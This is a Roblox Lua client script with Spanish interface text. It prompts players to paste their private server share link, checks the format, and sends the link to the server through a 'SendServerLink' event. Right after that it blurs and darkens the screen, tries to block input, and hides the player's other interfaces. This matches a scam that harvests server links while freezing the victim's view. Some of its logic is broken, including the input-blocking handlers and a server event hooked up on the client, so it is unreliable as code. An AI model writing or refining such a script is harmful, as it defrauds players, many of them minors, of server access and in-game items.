local Player = game.Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local SoundService = game:GetService("SoundService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local UserInputService = game:GetService("UserInputService")

-- ====== UI ======
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = Player:WaitForChild("PlayerGui")
ScreenGui.DisplayOrder = 100

local Frame = Instance.new("Frame")
Frame.Parent = ScreenGui
Frame.Size = UDim2.new(0, 400, 0, 300)
Frame.Position = UDim2.new(0.5, -200, 0.5, -150)
Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)

local Label = Instance.new("TextLabel")
Label.Parent = Frame
Label.Size = UDim2.new(1, -20, 0, 30)
Label.Position = UDim2.new(0, 10, 0, 10)
Label.Text = "Ingresa el link de tu servidor privado:"
Label.TextColor3 = Color3.fromRGB(255, 255, 255)
Label.BackgroundTransparency = 1

local TextBox = Instance.new("TextBox")
TextBox.Parent = Frame
TextBox.Size = UDim2.new(1, -20, 0, 50)
TextBox.Position = UDim2.new(0, 10, 0, 50)
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
TextBox.ClearTextOnFocus = false
TextBox.Text = "https://www.roblox.com/share?code="

local MessageLabel = Instance.new("TextLabel")
MessageLabel.Parent = Frame
MessageLabel.Size = UDim2.new(1, -20, 0, 30)
MessageLabel.Position = UDim2.new(0, 10, 0, 110)
MessageLabel.BackgroundTransparency = 1
MessageLabel.Text = ""
MessageLabel.TextColor3 = Color3.fromRGB(255, 0, 0)

local Button = Instance.new("TextButton")
Button.Parent = Frame
Button.Size = UDim2.new(1, -20, 0, 50)
Button.Position = UDim2.new(0, 10, 0, 150)
Button.Text = "Enviar"
Button.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Button.TextColor3 = Color3.fromRGB(255, 255, 255)

-- ====== Validación del link ======
local function isLinkValid(link)
    local startPart = "https://www.roblox.com/share?code="
    local endPart = "&type=Server"
    return string.sub(link, 1, #startPart) == startPart and string.sub(link, -#endPart) == endPart
end

-- ====== Freeze visual completo ======
local function freezeEnvironment()
    -- 1) Crear un ScreenGui con Frame que cubra toda la pantalla
    local freezeGui = Instance.new("ScreenGui")
    freezeGui.Name = "FreezeGui"
    freezeGui.ResetOnSpawn = false
    freezeGui.Parent = Player:WaitForChild("PlayerGui")
    freezeGui.DisplayOrder = 999

    local freezeFrame = Instance.new("Frame")
    freezeFrame.Size = UDim2.new(1,0,1,0)
    freezeFrame.Position = UDim2.new(0,0,0,0)
    freezeFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
    freezeFrame.BackgroundTransparency = 0.5 -- Ajusta para efecto de “congelado”
    freezeFrame.Parent = freezeGui

    -- 2) Agregar BlurEffect si no existe
    if not Lighting:FindFirstChild("FreezeBlur") then
        local blur = Instance.new("BlurEffect")
        blur.Name = "FreezeBlur"
        blur.Size = 24
        blur.Parent = Lighting
    end

    -- 3) Deshabilitar inputs del jugador
    UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if freezeGui.Parent then
            gameProcessed = true
        end
    end)
    UserInputService.InputChanged:Connect(function(input, gameProcessed)
        if freezeGui.Parent then
            gameProcessed = true
        end
    end)
    UserInputService.InputEnded:Connect(function(input, gameProcessed)
        if freezeGui.Parent then
            gameProcessed = true
        end
    end)
end

-- ====== Botón principal ======
Button.MouseButton1Click:Connect(function()
    local link = TextBox.Text
    if isLinkValid(link) then
        MessageLabel.Text = "El link es válido ✅"
        MessageLabel.TextColor3 = Color3.fromRGB(0, 255, 0)

        local remoteEvent = ReplicatedStorage:FindFirstChild("SendServerLink")
        if remoteEvent then
            remoteEvent:FireServer(link)
        end

        freezeEnvironment()

        -- Ocultar otras GUIs
        for _, child in pairs(Player.PlayerGui:GetChildren()) do
            if child:IsA("ScreenGui") and child.Name ~= "RobloxGui" and child.Name ~= "FreezeGui" then
                child.Enabled = false
            end
        end

        ScreenGui:Destroy()
    else
        MessageLabel.Text = "El link es inválido ❌"
        MessageLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    end
end)

-- ====== Manejo de StopAllEvents ======
local stopEvent = ReplicatedStorage:FindFirstChild("StopAllEvents")
if stopEvent then
    stopEvent.OnServerEvent:Connect(function(player)
        for _, event in pairs(ReplicatedStorage:GetChildren()) do
            if event:IsA("RemoteEvent") or event:IsA("RemoteFunction") then
                event:FireAllClients()
            end
        end
    end)
end
